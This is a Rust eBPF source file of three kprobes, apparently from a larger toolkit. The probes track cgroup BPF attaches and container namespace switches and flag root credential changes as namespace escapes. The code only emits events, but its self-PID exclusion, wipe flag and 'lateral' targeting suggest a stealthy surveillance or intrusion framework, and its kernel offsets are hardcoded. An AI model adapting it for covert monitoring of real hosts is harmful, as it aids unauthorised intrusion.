use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::kprobe,
    programs::ProbeContext,
};
use common::{
    EventHeader, EVENT_CGROUP_BPF_INJECT, EVENT_CONTAINER_LATERAL, EVENT_NAMESPACE_ESCAPE,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 58: Cgroup BPF Injection
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_cgroup_bpf_attach(ctx: ProbeContext) -> u32 {
    try_cgroup_bpf_attach(&ctx).unwrap_or_default()
}

fn try_cgroup_bpf_attach(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let enabled = match unsafe { LATERAL_STATE.get(0) } {
        Some(&v) => v,
        None => return Ok(0),
    };
    if enabled == 0 {
        return Ok(0);
    }

    let cgroup_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let cgroup_id: u64 = unsafe { bpf_probe_read_kernel((cgroup_ptr + 80) as *const u64)? };

    if unsafe { CGROUP_TARGETS.get(&cgroup_id) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_CGROUP_BPF_INJECT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: cgroup_id,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 59: Cross-Container Namespace Traversal
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_switch_namespaces(ctx: ProbeContext) -> u32 {
    try_switch_namespaces(&ctx).unwrap_or_default()
}

fn try_switch_namespaces(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let task_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let nsproxy_ptr: u64 = unsafe { bpf_probe_read_kernel((task_ptr + 1312) as *const u64)? };
    let pid_ns_ptr: u64 = unsafe { bpf_probe_read_kernel((nsproxy_ptr + 40) as *const u64)? };
    let ns_inum: u64 = unsafe { bpf_probe_read_kernel((pid_ns_ptr + 80) as *const u64)? };

    let _ = unsafe { CONTAINER_NS_MAP.insert(&pid, &ns_inum, 0) };

    let event = EventHeader {
        event_type: EVENT_CONTAINER_LATERAL,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: ns_inum,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 60: Namespace Escape Detection
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_commit_creds_ns(ctx: ProbeContext) -> u32 {
    try_commit_creds_ns(&ctx).unwrap_or_default()
}

fn try_commit_creds_ns(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let new_cred_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let uid: u32 = unsafe { bpf_probe_read_kernel((new_cred_ptr + 4) as *const u32)? };

    if uid == 0 {
        if let Some(&prev_ns) = unsafe { CONTAINER_NS_MAP.get(&pid) } {
            if prev_ns != 0 {
                let event = EventHeader {
                    event_type: EVENT_NAMESPACE_ESCAPE,
                    pid,
                    timestamp_ns: unsafe { bpf_ktime_get_ns() },
                    context: prev_ns,
                };
                let _ = EVENTS.output(&event, 0);
            }
        }
    }

    Ok(0)
}
